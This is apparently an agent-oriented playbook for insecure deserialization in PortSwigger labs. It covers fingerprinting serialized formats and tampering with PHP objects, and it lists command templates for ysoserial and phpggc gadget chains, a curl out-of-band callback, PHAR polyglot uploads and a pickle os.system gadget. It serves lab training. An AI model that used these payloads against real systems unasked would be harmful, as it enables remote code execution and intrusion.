# Insecure Deserialization Methodology
## Expert-Level Playbook (Java / PHP / Ruby / PHAR gadget chains)

> 9 PortSwigger labs. Deserializing attacker-controlled data lets you smuggle
> object graphs that execute code during reconstruction (magic methods /
> gadget chains). Identify the format, tamper the smallest field first, then
> escalate to a gadget chain with `ysoserial_gen` / `phpggc_gen`.

---

## Phase 1: Recon — spot serialized data

### 1.1 Where it hides
- Cookies (`session`), hidden form fields, `Authorization`, API params
- Look for base64 blobs, magic bytes, or language-specific markers

### 1.2 Format fingerprints
| Language | Marker (raw / base64 prefix) |
|----------|------------------------------|
| Java     | `AC ED 00 05` / base64 `rO0` (also `H4sI...` if gzipped) |
| PHP      | `O:8:"stdClass":...` / `a:2:{...}` |
| Ruby     | `\x04\x08` (Marshal) / base64 `BAh` |
| .NET     | `AAEAAAD/////` (BinaryFormatter) |
| Python   | pickle opcodes `(dp0`, `\x80\x04` |
| Node     | `_$$ND_FUNC$$_` (node-serialize) |

### 1.3 Decode & inspect
```
run_shell command="echo '<b64>' | base64 -d | xxd | head"
jwt_tool           # if the token is actually a JWT, not raw serialization
```

---

## Phase 2: Manipulation ladder (least → most invasive)

1. **Modify a non-dangerous field** (e.g. PHP `O:4:"User":2:{s:5:"admin";b:0;}`
   → flip `b:0` to `b:1`; fix the length prefixes). Confirm behavior change.
2. **Type juggling / attribute injection** — add/alter attributes the app trusts.
3. **Signed data** — if an HMAC/signature wraps the blob, hunt for the key
   (source leak, `/backup`, default keys) before tampering.
4. **Gadget chain** — full RCE/file-read via library gadgets.

### 2.1 PHP hand-tampering (fix lengths!)
```
O:4:"User":2:{s:8:"username";s:6:"wiener";s:11:"accessToken";s:32:"...";}
# String length s:N must match byte count exactly, or unserialize fails.
```

---

## Phase 3: Gadget Chains

### 3.1 Java — ysoserial
```
ysoserial_gen gadget=CommonsCollections4 command="curl OOB"
ysoserial_gen gadget=URLDNS command="http://OOB"     # blind detection (DNS only)
ysoserial_gen gadget=CommonsCollections2 command="..."
# Place the base64 output back into the vulnerable cookie/field.
```
- Start with **URLDNS** (no RCE, just a DNS lookup) to confirm the sink using
  `oob_get_domain` / `oob_poll` before firing an RCE chain.
- Match the gadget to libraries on the classpath (error messages, JARs).

### 3.2 PHP — phpggc + custom
```
phpggc_gen chain="Monolog/RCE1" command="id"
phpggc_gen chain="Symfony/RCE4" command="..."
phpggc_gen chain="Guzzle/FW1" command="..."   # file write
```
Custom gadget: define a class with a dangerous `__wakeup`/`__destruct` present in
the app source; craft the serialized object to trigger it.

### 3.3 PHAR deserialization (no unserialize() call needed)
Any filesystem op on a `phar://` path deserializes PHAR metadata:
```
phpggc_gen -p phar -o exploit.phar <chain> <cmd>   # build a polyglot PHAR
# Upload as an allowed type (e.g. JPEG-prefixed PHAR), then trigger a file op:
#   ?file=phar://uploads/avatar.jpg
```
Combine with file-upload labs: prepend valid image magic bytes so the upload
filter passes, then reference it via `phar://`.

### 3.4 Ruby (Marshal) / .NET / Python
- **Ruby**: universal gadget chain via `Gem::*` (Marshal.load). 
- **.NET**: `ysoserial.net` gadgets (`TypeConfuseDelegate`) for BinaryFormatter/
  `ObjectStateFormatter`.
- **Python**: pickle `__reduce__` returning `(os.system, ("cmd",))`.

---

## Phase 4: PortSwigger Sub-variant Tips

| Sub-variant | Move |
|-------------|------|
| Modifying serialized objects | flip a boolean/role field, fix length prefixes |
| Modifying serialized data types | PHP loose compare (`0==`) type juggling |
| Using application functionality | invoke an app method via crafted object (file delete) |
| Arbitrary object injection (PHP) | craft `O:` for a class with a dangerous magic method |
| Java `ysoserial` | pick the on-classpath gadget; URLDNS to confirm first |
| PHP custom gadget chain | read source, chain `__destruct`→`__toString`→sink |
| PHAR | polyglot upload + `phar://` trigger |
| Ruby / signed | recover the secret, then Marshal gadget |

---

## Phase 5: Tooling

```
ysoserial_gen    # Java / .NET gadget payloads
phpggc_gen       # PHP gadget chains + PHAR polyglots
oob_get_domain / oob_poll   # blind RCE/DNS confirmation (start with URLDNS)
http_request     # deliver the tampered cookie/field
run_shell        # base64 decode/encode, xxd, hexdump, build payloads
```

## Common Failure Modes & Solutions

| Problem | Solution |
|---------|----------|
| `unserialize()` fails | PHP string length prefixes must match byte count exactly |
| Signed blob rejected | Find the signing key (leak/backup/default) before tampering |
| Gadget doesn't fire | Match gadget to actual library versions on the target |
| No output (blind) | Use URLDNS/OOB payloads and poll for the callback |
| Upload filter blocks PHAR | Prepend valid image magic bytes (polyglot) |

## Validation / Success Criteria
- [ ] Tampered object changes server behavior (role/flag/type juggling), or
- [ ] Gadget chain yields OOB callback / command output / file read-write.
- [ ] A control (unmodified) blob does not reproduce the impact.
- [ ] Lab solved banner observed.
